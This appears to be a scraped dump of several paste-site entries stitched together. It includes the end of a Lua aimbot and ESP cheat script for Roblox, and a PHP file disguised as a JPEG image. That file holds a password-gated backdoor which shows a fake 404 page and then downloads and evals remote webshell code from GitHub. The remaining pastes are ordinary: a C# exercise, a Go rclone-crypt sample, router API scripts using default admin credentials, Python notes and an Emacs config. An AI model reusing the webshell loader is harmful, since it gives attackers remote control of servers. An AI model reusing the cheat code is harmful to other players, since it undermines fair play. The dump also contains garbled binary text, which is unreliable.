					v:Destroy()
				end
			else
				v:Destroy()
			end
		
	
end
st1.Text = uc(aimbotstatus)
local espforlder
local partconverter = Instance.new(""Part"")
--local headsupdatelist = {}
st1_3.FocusLost:connect(function()
	if tonumber(st1_3.Text) then
		bspeed = tonumber(st1_3.Text)
	else
		
	end
end)
f.addesp = function()
	pcall(function()
	--print(""ESP ran"")
	if espforlder then
		espforlder:Destroy()
		espforlder = Instance.new(""Folder"")
		espforlder.Parent = game.Workspace.CurrentCamera
	else
		espforlder = Instance.new(""Folder"")
		espforlder.Parent = game.Workspace.CurrentCamera
	end
	for i, v in pairs(espforlder:GetChildren()) do
		v:Destroy()
	end
	for _, plr in pairs(plrs:GetChildren()) do
		if plr.Character and plr.Character.Humanoid.Health > 0 and plr.Name ~= lplr.Name then
			if TeamBased == true then
				
				if plr.Team.Name ~= plrs.LocalPlayer.Team.Name  then
					pcall(function()
					local e = espforlder:FindFirstChild(plr.Name)
					if not e then
						local fold = Instance.new(""Folder"", espforlder)
						fold.Name = plr.Name
						
						--partconverter.BrickColor = plr.Team.Color
						--local teamc = partconverter.Color
						for i, p in pairs(plr.Character:GetChildren()) do
							if p:IsA(""BasePart"") and p.Name ~= ""HumanoidRootPart"" then
								if charmsesp then
								local urmom = Instance.new(""BoxHandleAdornment"")
								urmom.ZIndex = 10
								urmom.AlwaysOnTop = true
								urmom.Color3 = espcolor
								urmom.Size = p.Size
								urmom.Adornee = p
								urmom.Name = tick().."" Ur mom has big gay""
								urmom.Transparency = wallhack_esp_transparency
								urmom.Parent = fold
								if p.Name == ""Head"" then
									local th = p:FindFirstChild(""headoverthing"")
									if not th then
										local ht = espheadthing:Clone()
										ht.PName.Text = p.Parent.Name
										ht.Adornee = p
										--table.insert(headsupdatelist, ht)
										delay(0, function()
											while wait(0.08) and plr and p do
												f.UpdateHeadUI(ht)
											end
										end)
										ht.Parent = p
									end
								end
								end
							end
						end
						plr.Character.Humanoid.Died:Connect(function()
							fold:Destroy()
						end)
						
					end
					end)
				end
			else
				local e = espforlder:FindFirstChild(plr.Name)
				if not e then
					local fold = Instance.new(""Folder"", espforlder)
						fold.Name = plr.Name
						
						--partconverter.BrickColor = plr.Team.Color
						--local teamc = Move.BackgroundColor3
						for i, p in pairs(plr.Character:GetChildren()) do
							if p:IsA(""BasePart"") and p.Name ~= ""HumanoidRootPart"" then
								pcall(function()
								if charmsesp then
								local urmom = Instance.new(""BoxHandleAdornment"")
								urmom.ZIndex = 10
								urmom.AlwaysOnTop = true
								urmom.Color3 = espcolor
								urmom.Size = p.Size
								urmom.Adornee = p
								urmom.Name = tick().."" Ur mom has big gay""
								urmom.Transparency = wallhack_esp_transparency
								urmom.Parent = fold
								end
								if p.Name == ""Head"" then
									local th = p:FindFirstChild(""headoverthing"")
									if not th then
										local ht = espheadthing:Clone()
										ht.PName.Text = p.Parent.Name
										ht.Adornee = p
										delay(0, function()
											while wait(0.08) and plr and p do
												f.UpdateHeadUI(ht)
											end
										end)
										--table.insert(headsupdatelist, ht)
										ht.Parent = p
									end
								end
								end)
							end
						end
						plr.Character.Humanoid.Died:Connect(function()
							fold:Destroy()
						end)
				end
			end
			
			
		end
	end
	end)
end

local uis = game:GetService(""UserInputService"")
local bringall = false
local hided2 = false
local upping = false
local downing = false
mouse.KeyDown:Connect(function(a)
	
	if a == ""n"" then
		--print(""worked1"")
		f.addesp()
	elseif a == gui_hide_button[2] and uis:IsKeyDown(gui_hide_button[1]) then
		if hided2 == false then
			hided2 = true
			autoesp =false
			if espforlder then
				espforlder:Destroy()
			end
			Gui.Enabled = false
		else
			Gui.Enabled = true
			hided2 = false
		end
			
	elseif a == """" then
		if aimbothider == false then
			aimbothider = true
			if aimbothider == true then
			aimbothiderbox.Text = ""Speed :""..tostring(aimbothiderspeed).."" on""
		else
			aimbothiderbox.Text = ""Speed :""..tostring(aimbothiderspeed).."" off""
		end
		else
			
			aimbothider = false
			if aimbothider == true then
			aimbothiderbox.Text = ""Speed :""..tostring(aimbothiderspeed).."" on""
		else
			aimbothiderbox.Text = ""Speed :""..tostring(aimbothiderspeed).."" off""
		end
		end
		if aimbothider == true then
			aimbothiderbox.TextColor3 =Color3.fromRGB(11, 255, 19)
		else
			aimbothiderbox.TextColor3 =Color3.fromRGB(255, 0, 0)
		end
	elseif a == ""l"" then
		if not uis:IsKeyDown(Enum.KeyCode.LeftControl) then
			if autoesp == false then
				autoesp = true
			else
				autoesp = false
			end
		else
			if lightesp == true then
				lightesp = false
			else
				lightesp = true
			end
		end
	elseif a == ""]"" then
		upping = true
		downing = false
	elseif a== ""["" then
		downing = true
		upping = false
	elseif a == Aim_Assist_Key[2] and uis:IsKeyDown(Aim_Assist_Key[1]) then
		if Aim_Assist == true then
			Aim_Assist = false
			--print(""disabled"")
		else
			Aim_Assist = true
		end
	end
	if a == ""j"" then
		if mouse.Target then
			mouse.Target:Destroy()
		end
	end
	if a == key then
		if switch == false then
			switch = true
		else
			switch = false
			if aimatpart ~= nil then
				aimatpart = nil
			end
		end
	elseif a == ""b"" and uis:IsKeyDown(Enum.KeyCode.LeftControl) and not uis:IsKeyDown(Enum.KeyCode.R) then
		if movementcounting then
			movementcounting = false
		else
			movementcounting = true
		end
	elseif a == teambasedswitch then
		if TeamBased == true then
			TeamBased = false
			teambasedstatus.Text = ""Team Based: ""..tostring(TeamBased)
		else
			TeamBased = true
			teambasedstatus.Text = ""Team Based: ""..tostring(TeamBased)
		end
	elseif a == ""b"" and uis:IsKeyDown(Enum.KeyCode.LeftControl) and uis:IsKeyDown(Enum.KeyCode.R) then
		ballisticsboost = 0
	elseif a == aimkey then
		if not aimatpart then
			local maxangle = math.rad(20)
			for i, plr in pairs(plrs:GetChildren()) do
				if plr.Name ~= lplr.Name and plr.Character and plr.Character.Head and plr.Character.Humanoid and plr.Character.Humanoid.Health > 1 then
					if TeamBased == true then
						if plr.Team.Name ~= lplr.Team.Name then
							local an = checkfov(plr.Character.Head)
							if an < maxangle then
								maxangle = an
								aimatpart = plr.Character.Head
							end
						end
					else
						local an = checkfov(plr.Character.Head)
							if an < maxangle then
								maxangle = an
								aimatpart = plr.Character.Head
							end
							--print(plr)
					end
					local old = aimatpart
					plr.Character.Humanoid.Died:Connect(function()
						--print(""died"")
						if aimatpart and aimatpart == old then
							aimatpart = nil
						end
					end)
					
				end
			end
		else
			aimatpart = nil
			canaimat = false
			delay(1.1, function()
				canaimat = true
			end)
		end
	end
end)

function getfovxyz (p0, p1, deg)
	local x1, y1, z1 = p0:ToOrientation()
	local cf = CFrame.new(p0.p, p1.p)
	local x2, y2, z2 = cf:ToOrientation()
	local d = math.deg
	if deg then
		return Vector3.new(d(x1-x2), d(y1-y2), d(z1-z2))
	else
		return Vector3.new((x1-x2), (y1-y2), (z1-z2))
	end
end


function aimat(part)
	if part then
		--print(part)
		local d = (cam.CFrame.p - part.CFrame.p).magnitude
		local calculatedrop
		local timetoaim = 0
		local pos2 = Vector3.new()
		if movementcounting == true then
			timetoaim = d/bspeed
			pos2 = part.Velocity * timetoaim
		end
		local minuseddrop = (ballisticsboost+50)/50
		if ballisticsboost ~= 0 then
			calculatedrop = d - (d/minuseddrop)
			
		else
			calculatedrop = 0
		end
		--print(calculatedrop)
		local addative = Vector3.new()
		if movementcounting then
			addative = pos2
		end
		local cf = CFrame.new(cam.CFrame.p, (addative + part.CFrame.p+ Vector3.new(0, calculatedrop, 0)))
		if aimbothider == true or Aim_Assist == true then
			cam.CFrame = cam.CFrame:Lerp(cf, aimbothiderspeed)
		else
			
			cam.CFrame = cf
		end
		--print(cf)
	end
end
function checkfov (part)
	local fov = getfovxyz(game.Workspace.CurrentCamera.CFrame, part.CFrame)
	local angle = math.abs(fov.X) + math.abs(fov.Y)
	return angle
end
pcall(function()
	delay(0, function()
		while wait(.32) do
			if Aim_Assist and not aimatpart and canaimat and lplr.Character and lplr.Character.Humanoid and lplr.Character.Humanoid.Health > 0 then
				for i, plr in pairs(plrs:GetChildren()) do
					
					
						local minangle = math.rad(5.5)
						local lastpart = nil
						local function gg(plr)
							pcall(function()
							if plr.Name ~= lplr.Name and plr.Character and plr.Character.Humanoid and plr.Character.Humanoid.Health > 0 and plr.Character.Head then
								local raycasted = false
								local cf1 = CFrame.new(cam.CFrame.p, plr.Character.Head.CFrame.p) * CFrame.new(0, 0, -4)
								local r1 = Ray.new(cf1.p, cf1.LookVector * 9000)
								local obj, pos = game.Workspace:FindPartOnRayWithIgnoreList(r1,  {lplr.Character.Head})
								local dist = (plr.Character.Head.CFrame.p- pos).magnitude
								if dist < 4 then
									raycasted = true
								end
								if raycasted == true then
									local an1 = getfovxyz(cam.CFrame, plr.Character.Head.CFrame)
									local an = abs(an1.X) + abs(an1.Y)
									if an < minangle then
										minangle = an
										lastpart = plr.Character.Head
									end
								end
							end
							end)
						end
						if TeamBased then
							if plr.Team.Name ~= lplr.Team.Name then
								gg(plr)
							end
						else
							gg(plr)
						end
						--print(math.deg(minangle))
						if lastpart then
							aimatpart = lastpart
							aimatpart.Parent.Humanoid.Died:Connect(function()
								if aimatpart == lastpart then
									aimatpart = nil
								end
							end)
						
					end
				end
			end
		end
	end)
end)
local oldheadpos
local lastaimapart
game:GetService(""RunService"").RenderStepped:Connect(function(dt)
	if uis:IsKeyDown(Enum.KeyCode.RightBracket) or uis:IsKeyDown(Enum.KeyCode.LeftBracket) then
		if upping then
			ballisticsboost = ballisticsboost + dt/1.9
		elseif downing then
			ballisticsboost = ballisticsboost - dt/1.9
		end
	end
	if movementcounting then
		st1_2.TextColor3 = Color3.new(0.0431373, 1, 0.0745098)
		st1_2.Text = ""Current ballistics: ""..tostring(math.floor(ballisticsboost*10)/10)
	else
		st1_2.TextColor3 = Color3.new(1,0,0)
	end
	espstatustext.Text = ""Esp loop :""..tostring(autoesp)
	if aimatpart and lplr.Character and lplr.Character.Head then
		if BetterDeathCount and lastaimapart and lastaimapart == aimatpart then
			local dist = (oldheadpos - aimatpart.CFrame.p).magnitude
			if dist > 40 then
				aimatpart = nil
			end
		end
		lastaimapart = aimatpart
		oldheadpos = lastaimapart.CFrame.p
		do 
			if aimatpart.Parent == plrs.LocalPlayer.Character then
				aimatpart = nil
			end
			aimat(aimatpart)
			pcall(function()
				if Aim_Assist == true then
					local cf1 = CFrame.new(cam.CFrame.p, aimatpart.CFrame.p) * CFrame.new(0, 0, -4)
					local r1 = Ray.new(cf1.p, cf1.LookVector * 1000)
					local obj, pos = game.Workspace:FindPartOnRayWithIgnoreList(r1,  {lplr.Character.Head})
					local dist = (aimatpart.CFrame.p- pos).magnitude
					if obj then
						--print(obj:GetFullName())
					end
					if not obj or dist > 6 then
						aimatpart = nil
						--print(""ooof"")
					end
					canaimat = false
					delay(.5, function()
						canaimat = true
					end)
				end
			end)
		end
		
		
		
	end
end)


delay(0, function()
	while wait(espupdatetime) do
		if autoesp == true then
			pcall(function()
			f.addesp()
			end)
		end
	end
end)
--warn(""loaded"")
end)"
X2b5TVia,min,blackhat1337,PHP,Friday 5th of July 2024 12:34:06 PM CDT,"
	

			

		


ÔøΩÔøΩC	ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ""#QrÔøΩÔøΩÔøΩÔøΩ&1!A""2qQaÔøΩÔøΩÔøΩ?ÔøΩy,ÔøΩ/3JÔøΩ›πÔøΩﬂ≤ÿã5ÔøΩXwÔøΩÔøΩÔøΩyÔøΩRÔøΩÔøΩI0ÔøΩ2ÔøΩPIÔøΩIÔøΩÔøΩiMÔøΩÔøΩÔøΩÔøΩrÔøΩN&""KgX:ÔøΩÔøΩÔøΩÔøΩnTJnLKÔøΩÔøΩ@!ÔøΩ-ÔøΩÔøΩÔøΩÔøΩmÔøΩ;ÔøΩgÔøΩÔøΩÔøΩ&ÔøΩhwÔøΩÔøΩÔøΩ@ÔøΩ‹ó9ÔøΩ-ÔøΩ.ÔøΩ1<yÔøΩÔøΩÔøΩÔøΩQÔøΩUÔøΩ€Å?.ÔøΩÔøΩÔøΩÔøΩbﬂ±ÔøΩ÷´ÔøΩw*VÔøΩÔøΩ) `$ÔøΩÔøΩbÔøΩ‘üÔøΩÔøΩXÔøΩ-ÔøΩTÔøΩÔøΩGÔøΩ3ÔøΩg ÔøΩÔøΩÔøΩÔøΩJxÔøΩÔøΩÔøΩU/ÔøΩÔøΩv_s(HÔøΩ@TÔøΩJÔøΩÔøΩÔøΩÔøΩnÔøΩÔøΩ!ÔøΩgfbÔøΩcÔøΩ:ÔøΩl[ÔøΩQe9ÔøΩPLbÔøΩÔøΩCÔøΩm[5ÔøΩÔøΩ'ÔøΩjglÔøΩÔøΩÔøΩ_ÔøΩÔøΩÔøΩl-;""PkÔøΩÔøΩÔøΩQÔøΩ_ÔøΩ^ÔøΩSÔøΩx?""ÔøΩÔøΩÔøΩYÈ®êÔøΩOÔøΩ	qÔøΩ`~~ÔøΩtÔøΩUÔøΩC⁄íÔøΩV		I1ÔøΩÔøΩ_ÔøΩÔøΩ

ÔøΩÔøΩÔøΩÔøΩJFIFÔøΩÔøΩ
√ø√ò√ø√† JFIF      √ø√æ readme<?php
session_start();
$password = '62623caf10268b16bb27676b5b27678f';

if (!isset($_SESSION[md5($password)])) {
    if(isset($_POST['password']) && !empty($_POST['password']) && md5($_POST['password']) == $password) {
        $_SESSION[md5($password)] = true;
    } else {
        http_response_code(404);
        echo '<form method=""post"" action=""""><input type=""password"" style=""border:none"" name=""password""></form>';
        exit;
    }
}
$sa = file_get_contents('https://raw.githubusercontent.com/exploit-haxor/webshell/main/zz.php');
eval('?>'.$sa);
"
4XXX2mcE,Unit_34,lovelyvook,C#,Friday 5th of July 2024 12:01:42 PM CDT,"using System;
using System.Collections.Generic;

namespace Ijunior
{
    internal class Program
    {
        static void Main(string[] args)
        {
            const string CommandSum = ""sum"";
            const string CommandExit = ""exit"";

            List<int> numbers = new List<int>();
            string userInput;
            bool isWork = true;

            while (isWork)
            {
                ShowList(numbers);

                Console.Write($""\n\n–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –∏–ª–∏ {CommandSum} –¥–ª—è —Å—É–º–º—ã –∏ {CommandExit} –¥–ª—è –≤—ã—Ö–æ–¥–∞: "");
                userInput = Console.ReadLine();

                if (userInput.ToLower() == CommandSum)
                {
                    Console.WriteLine(""–°—É–º–º–∞ —á–∏—Å–µ–ª —Å–ø–∏—Å–∫–∞: "" + CountSum(numbers));
                    Console.ReadKey();
                }
                else if (userInput.ToLower() == CommandExit)
                {
                    isWork = false;
                }
                else
                {
                    if (int.TryParse(userInput, out int number))
                    {
                        numbers.Add(number);
                    }
                }

                Console.Clear();
            }
        }

        static void ShowList(List<int> numbers)
        {
            if (numbers.Count > 0)
            {
                foreach (int number in numbers)
                {
                    Console.Write(number + "" "");
                }
            }
            else
            {
                Console.Write(""–°–ø–∏—Å–æ–∫ –ø—É—Å—Ç"");
            }
        }

        static int CountSum(List<int> numbers)
        {
            int sum = 0;

            foreach (int number in numbers)
            {
                sum += number;
            }

            return sum;
        }
    }
}"
jHbYCg9Y,rclone crypt go lang sample,WebStream,Go,Friday 5th of July 2024 11:36:20 AM CDT,"package main

import (
	""bytes""
	""crypto/rand""
	""encoding/hex""
	""fmt""
	""io""
	""os""
	""time""

	""golang.org/x/crypto/scrypt""
	""golang.org/x/crypto/nacl/secretbox""
)

const (
	fileMagicSize   = 8
	fileNonceSize   = 24
	fileHeaderSize  = fileMagicSize + fileNonceSize
	blockHeaderSize = secretbox.Overhead
	blockDataSize   = 64 * 1024
	blockSize       = blockHeaderSize + blockDataSize
)

var (
	fileMagic   = []byte(""RCLONE\x00\x00"")
	defaultSalt = []byte{
		0xA8, 0x0D, 0xF4, 0x3A, 0x8F, 0xBD, 0x03, 0x08,
		0xA7, 0xCA, 0xB8, 0x3E, 0x58, 0x1F, 0x86, 0xB1,
	}
	plainblock  = make([]byte, blockDataSize)
	chiperblock = make([]byte, blockSize)
)

func makeKey(password, salt []byte) ([]byte, error) {
	keySize := 32
	if len(password) == 0 {
		return make([]byte, keySize), nil
	}
	if len(salt) == 0 {
		salt = defaultSalt
	}
	return scrypt.Key(password, salt, 16384, 8, 1, keySize)
}

func encryptFile(inputfile, outputfile string, dataKey *[32]byte) error {
	infile, err := os.Open(inputfile)
	if err != nil {
		return fmt.Errorf(""failed to open input file: %s"", inputfile)
	}
	defer infile.Close()

	outfile, err := os.Create(outputfile)
	if err != nil {
		return fmt.Errorf(""failed to open output file: %s"", outputfile)
	}
	defer outfile.Close()

	nonce := new([fileNonceSize]byte)
	if _, err := rand.Read(nonce[:]); err != nil {
		return fmt.Errorf(""failed to generate nonce: %v"", err)
	}

	fmt.Printf(""file nonce:\n%s\n"", hex.Dump(nonce[:]))

	if _, err := outfile.Write(fileMagic); err != nil {
		return fmt.Errorf(""failed to write magic to output file: %s"", outputfile)
	}
	if _, err := outfile.Write(nonce[:]); err != nil {
		return fmt.Errorf(""failed to write nonce to output file: %s"", outputfile)
	}

	i := 0
	for {
		fmt.Printf(""block %d\n"", i)
		mlen, err := infile.Read(plainblock)
		if err != nil && err != io.EOF {
			return fmt.Errorf(""failed to read input file: %s"", inputfile)
		}
		if mlen == 0 {
			break
		}

		chiperblock = secretbox.Seal(chiperblock[:0], plainblock[:mlen], nonce, dataKey)
		if _, err := outfile.Write(chiperblock); err != nil {
			return fmt.Errorf(""failed to write block %d to output file: %s"", i, outputfile)
		}

		incrementNonce(nonce[:])
		i++
	}

	return nil
}

func decryptFile(inputfile, outputfile string, dataKey *[32]byte) error {
	infile, err := os.Open(inputfile)
	if err != nil {
		return fmt.Errorf(""failed to open input file: %s"", inputfile)
	}
	defer infile.Close()

	outfile, err := os.Create(outputfile)
	if err != nil {
		return fmt.Errorf(""failed to open output file: %s"", outputfile)
	}
	defer outfile.Close()

	magic := make([]byte, fileMagicSize)
	if _, err := infile.Read(magic); err != nil {
		return fmt.Errorf(""failed to read magic from input file: %s"", inputfile)
	}
	if !bytes.Equal(magic, fileMagic) {
		return fmt.Errorf(""header magic not found in input file: %s"", inputfile)
	}

	nonce := new([fileNonceSize]byte)
	if _, err := infile.Read(nonce[:]); err != nil {
		return fmt.Errorf(""failed to read nonce from input file: %s"", inputfile)
	}

	fmt.Printf(""file nonce:\n%s\n"", hex.Dump(nonce[:]))

	i := 0
	for {
		fmt.Printf(""block %d\n"", i)
		clen, err := infile.Read(chiperblock)
		if err != nil && err != io.EOF {
			return fmt.Errorf(""failed to read input file: %s"", inputfile)
		}
		if clen == 0 {
			break
		}
		if clen <= blockHeaderSize {
			return fmt.Errorf(""input file is broken (block %d, size %d): %s"", i, clen, inputfile)
		}

		plainblock, ok := secretbox.Open(nil, chiperblock[:clen], nonce, dataKey)
		if !ok {
			return fmt.Errorf(""failed to open block %d"", i)
		}

		if _, err := outfile.Write(plainblock); err != nil {
			return fmt.Errorf(""failed to write block %d to output file: %s"", i, outputfile)
		}

		incrementNonce(nonce[:])
		i++
	}

	return nil
}

func incrementNonce(nonce []byte) {
	for i := len(nonce) - 1; i >= 0; i-- {
		nonce[i]++
		if nonce[i] != 0 {
			break
		}
	}
}

func main() {
	if len(os.Args) < 5 {
		fmt.Printf(""usage: %s [c | d] (target) (output) (password) (salt)\n"", os.Args[0])
		return
	}

	mode := os.Args[1]
	inputfile := os.Args[2]
	outputfile := os.Args[3]
	password := []byte(os.Args[4])
	salt := []byte("""")
	if len(os.Args) == 6 {
		salt = []byte(os.Args[5])
	}

	dataKey, err := makeKey(password, salt)
	if err != nil {
		fmt.Printf(""failed to make key: %v\n"", err)
		return
	}

	var dataKeyArray [32]byte
	copy(dataKeyArray[:], dataKey)

	start := time.Now()
	if mode == ""c"" {
		fmt.Println(""encryption mode"")
		if err := encryptFile(inputfile, outputfile, &dataKeyArray); err != nil {
			fmt.Printf(""encryption failed: %v\n"", err)
			return
		}
	} else if mode == ""d"" {
		fmt.Println(""decryption mode"")
		if err := decryptFile(inputfile, outputfile, &dataKeyArray); err != nil {
			fmt.Printf(""decryption failed: %v\n"", err)
			return
		}
	} else {
		fmt.Printf(""select encrypt(c) or decrypt(d)\n"")
		fmt.Printf(""usage: %s [c | d] (target) (output) (password) (salt)\n"", os.Args[0])
		return
	}
	end := time.Now()
	fmt.Printf(""%s time %.6f sec\n"", mode, end.Sub(start).Seconds())
}"
h1d6ArcP,Untitled,G0nz0uk,Python,Friday 5th of July 2024 11:29:11 AM CDT,"import requests
from prometheus_client import start_http_server
import time

# Constants for the API endpoints and credentials
LOGIN_URL = ""http://1.1.1.1/api/login""
STATUS_URL = ""http://1.1.1.1/api/wireless/interfaces/status""
USERNAME = ""admin""
PASSWORD = ""admin""

# Global variable to store hostname and token
hostname = """"
token = """"

def get_bearer_token():
    global token
    # Perform login and retrieve bearer token
    login_data = {
        ""username"": USERNAME,
        ""password"": PASSWORD
    }
    try:
        response = requests.post(LOGIN_URL, json=login_data)
        response.raise_for_status()  # Raise an exception for 4xx or 5xx status codes
        response_json = response.json()
        token = response_json.get('token')
        print(""Successfully obtained bearer token."")
        return token
    except requests.exceptions.RequestException as e:
        print(f""Error during login: {e}"")
        return None

def fetch_data(bearer_token):
    global hostname
    # Fetch data using the bearer token
    if not bearer_token:
        return None

    headers = {
        ""Content-Type"": ""application/json"",
        ""Authorization"": f""Bearer {bearer_token}""
    }
    try:
        response = requests.get(STATUS_URL, headers=headers)
        response.raise_for_status()  # Raise an exception for 4xx or 5xx status codes
        response_json = response.json()
        hostname = response_json.get('hostname')
        print(""Successfully fetched hostname."")
        return hostname
    except requests.exceptions.RequestException as e:
        print(f""Error fetching data: {e}"")
        return None

def update_data():
    # Main function to update data (token and hostname)
    bearer_token = get_bearer_token()
    if bearer_token:
        fetch_data(bearer_token)

if __name__ == '__main__':
    # Start HTTP server for Prometheus to scrape metrics (optional if not using Prometheus metrics)
    start_http_server(8000)

    # Update data every 30 seconds
    while True:
        update_data()
        time.sleep(30)"
PpFHZ88f,Untitled,G0nz0uk,Python,Friday 5th of July 2024 11:26:42 AM CDT,"import requests
import json
# Login and get the token
login_url = ""http://1.1.1.1/api/login""
login_payload = {
    ""username"": ""admin"",
    ""password"": ""admin""
}
login_headers = {
    ""Content-Type"": ""application/json""
}
response = requests.post(login_url, headers=login_headers, data=json.dumps(login_payload))
# Check and print the login response
if response.status_code != 200:
    print(f""Login failed: {response.status_code}"")
    print(f""Response content: {response.text}"")
    response.raise_for_status()  # Will raise the HTTPError with detailed message
# Print the entire login response for debugging purposes
login_response_json = response.json()
print(""Login response JSON:"", json.dumps(login_response_json, indent=2))
# Assuming the token is nested in the 'data' key of the response JSON
# Adjust this based on your actual JSON structure
token = login_response_json.get('data', {}).get('token')
if not token:
    raise ValueError(""Token not found in the login response"")
# Use the token to get the wireless interface status
status_url = ""http://1.1.1.1/api/wireless/interfaces/status""
status_headers = {
    ""Content-Type"": ""application/json"",
    ""Authorization"": f""Bearer {token}""
}
status_response = requests.get(status_url, headers=status_headers)
status_response.raise_for_status()
# Print the JSON response of the wireless interface status
status_data = status_response.json()
print(""Wireless interfaces status JSON:"", json.dumps(status_data, indent=2))"
RNHndahG,Python,Aminechbani2,Python,Friday 5th of July 2024 11:13:24 AM CDT,"#Variables:
    examplevar = ""string""
    examplevar = 25 #integer
    examplevar = 2.5 #float
    examplevar = True #boolean
#Strings:
    vari = ""Hello "" + ""there"" #concatenated
    vari = f""{25} tomatoes"" #formatted
#Input & Output:
	name = input(""Enter your name:"") #input
    print(name) #output
#Type Conversion:
	str()
    int()
    float()
    	num = 20/5 #dividing an int always results in a float (implicit conversion)
        num = 20+2.5 #operations between an int and a float always result in a float
    bool()
#Comparison:
	> #greater
    <= #less or equal
    == #equal
    != #inequal
#Logical operations:
	op = True or False #=True
    op = True and False #=False
#Loops:
	for num in range(10): #for loop
        print(num)
    while num < 5:  #while loop
        num = num+1
#Conditional statements:
    if num >= 5
        print(""one"")
    elif num >=3:
        print(""two"")
    else:
        print(""three"")"
uuRcBW3C,Iter,koulin,Python,Friday 5th of July 2024 10:26:02 AM CDT,"comb = [[x,y] for x in range(6,15) for y in ['–ü–∏–∫–∏','–ë—É–±–∞','–ß–µ—Ä–≤–∏','–ö—Ä–µ—Å—Ç–∏']]
for x in comb: 
    print(*x)
print('Stop iteration')
"
fPStpbJY,Emacs Minimal Config,wolfjb,Lisp,Friday 5th of July 2024 10:19:56 AM CDT,";;; init.el --- Minimal initialization file -*- lexical-binding: t; -*-

;;; Commentary:
;; Minimal initialization to get a well configured Emacs, no packages
;; installed.

;;; Code:

(custom-set-variables
 ;; custom-set-variables was added by Custom.
 ;; If you edit it by hand, you could mess it up, so be careful.
 ;; Your init file should contain only one such instance.
 ;; If there is more than one, they won't work right.
 '(Man-notify-method 'aggressive)
 '(after-save-hook '(executable-make-buffer-file-executable-if-script-p))
 '(bidi-paragraph-direction 'left-to-right)
 '(bookmark-save-flag 1)
 '(column-number-mode t)
 '(completion-auto-select 'second-tab)
 '(completion-category-overrides '((file (styles partial-completion))))
 '(completion-cycle-threshold 3)
 '(completion-styles '(basic initials partial-completion emacs22))
 '(completions-detailed t)
 '(completions-format 'vertical)
 '(completions-group t)
 '(completions-group-sort 'alphabetical)
 '(completions-max-height 10)
 '(delete-selection-mode t)
 '(dired-auto-revert-buffer t)
 '(dired-dwim-target t)
 '(dired-listing-switches ""-al --group-directories-first"")
 '(dynamic-completion-mode t)
 '(ediff-window-setup-function 'ediff-setup-windows-plain)
 '(eglot-autoshutdown t)
 '(electric-pair-mode t)
 '(epg-pinentry-mode 'loopback)
 '(fast-but-imprecise-scrolling t)
 '(font-use-system-font t)
 '(global-auto-revert-mode t)
 '(global-auto-revert-non-file-buffers t)
 '(global-display-line-numbers-mode t)
 '(global-so-long-mode t)
 '(ibuffer-movement-cycle nil)
 '(ibuffer-old-time 24)
 '(indent-tabs-mode nil)
 '(isearch-allow-motion t)
 '(isearch-lazy-count t)
 '(isearch-yank-on-move 'shift)
 '(kill-do-not-save-duplicates t)
 '(load-prefer-newer t)
 '(org-adapt-indentation t t)
 '(org-agenda-files nil)
 '(org-agenda-include-diary t t)
 '(org-duration-format '((""h"") (special . h:mm)) t)
 '(org-export-backends '(ascii html icalendar latex md odt) t)
 '(org-outline-path-complete-in-steps nil t)
 '(org-refile-allow-creating-parent-nodes 'confirm t)
 '(org-refile-targets '((nil :maxlevel . 9) (org-agenda-files :maxlevel . 9)) t)
 '(org-refile-use-outline-path 'file t)
 '(package-archive-priorities
   '((""gnu"" . 99)
     (""nongnu"" . 80)
     (""stable"" . 70)
     (""melpa"" . 0)))
 '(prog-mode-hook
   '(flyspell-prog-mode abbrev-mode flymake-mode display-line-numbers-mode))
 '(repeat-mode t)
 '(savehist-mode t)
 '(scroll-conservatively 101)
 '(speedbar-update-flag t)
 '(speedbar-use-images nil)
 '(switch-to-buffer-in-dedicated-window 'pop)
 '(switch-to-buffer-obey-display-actions t)
 '(tab-always-indent 'complete)
 '(tab-bar-mode t)
 '(tab-bar-new-tab-choice ""*scratch*"")
 '(tab-bar-new-tab-to 'rightmost)
 '(tab-bar-select-tab-modifiers '(control meta))
 '(tab-bar-tab-hints t)
 '(tempo-interactive t)
 '(text-mode-hook
   '(turn-on-flyspell turn-on-auto-fill text-mode-hook-identify))
 '(tool-bar-mode nil)
 '(whitespace-action '(cleanup auto-cleanup) t)
 '(whitespace-style '(face empty trailing tab-mark indentation::space) t)
 '(winner-mode t)
 '(xref-show-definitions-function 'xref-show-definitions-completing-read))
(custom-set-faces
 ;; custom-set-faces was added by Custom.
 ;; If you edit it by hand, you could mess it up, so be careful.
 ;; Your init file should contain only one such instance.
 ;; If there is more than one, they won't work right.
 '(default ((t (:family ""DejaVu Sans Mono"" :foundry ""PfEd"" :slant normal :weight regular :height 158 :width normal))))
 '(fixed-pitch ((t (:inherit (default)))))
 '(fixed-pitch-serif ((t (:inherit (default)))))
 '(tab-bar-tab ((t (:box (:line-width (2 . -2) :color ""orange"") :foreground ""LightSteelBlue"" :background ""black"" :inherit mode-line-active))))
 '(tab-bar-tab-inactive ((t (:foreground ""SteelBlue"" :background ""grey75"" :inherit tab-bar-tab)))))

;;;; key bindings
(global-set-key [remap list-buffers] #'ibuffer-list-buffers)
(global-set-key (kbd ""C-+"") #'text-scale-increase)
(global-set-key (kbd ""C--"") #'text-scale-decrease)
(global-set-key (kbd ""M-#"") #'dictionary-lookup-definition)

;;;;; window navigation and control
(define-prefix-command 'minimal-windows-key-map)

(keymap-set 'minimal-windows-key-map ""u"" 'winner-undo)
(keymap-set 'minimal-windows-key-map ""r"" 'winner-redo)
(keymap-set 'minimal-windows-key-map ""n"" 'windmove-down)
(keymap-set 'minimal-windows-key-map ""p"" 'windmove-up)
(keymap-set 'minimal-windows-key-map ""b"" 'windmove-left)
(keymap-set 'minimal-windows-key-map ""f"" 'windmove-right)

(keymap-global-set ""C-c w"" 'minimal-windows-key-map)


;;;; lists

(add-to-list 'display-buffer-alist
             '(""^\\*Dictionary\\*""
               (display-buffer-in-side-window)
               (side . left)
               (window-width . 70)))
(add-to-list 'display-buffer-alist
             '(""\\*Help\\*""
               (display-buffer-reuse-window display-buffer-pop-up-window)))



(provide 'init)

;; Local Variables:
;; eval: (eldoc-mode)
;; eval: (outline-minor-mode 1)
;; End:

;;; init.el ends here
"
7Vm86phN,opraveny kod dost dobre AKkBb,max2201111,Python,Friday 5th of July 2024 10:12:31 AM CDT,
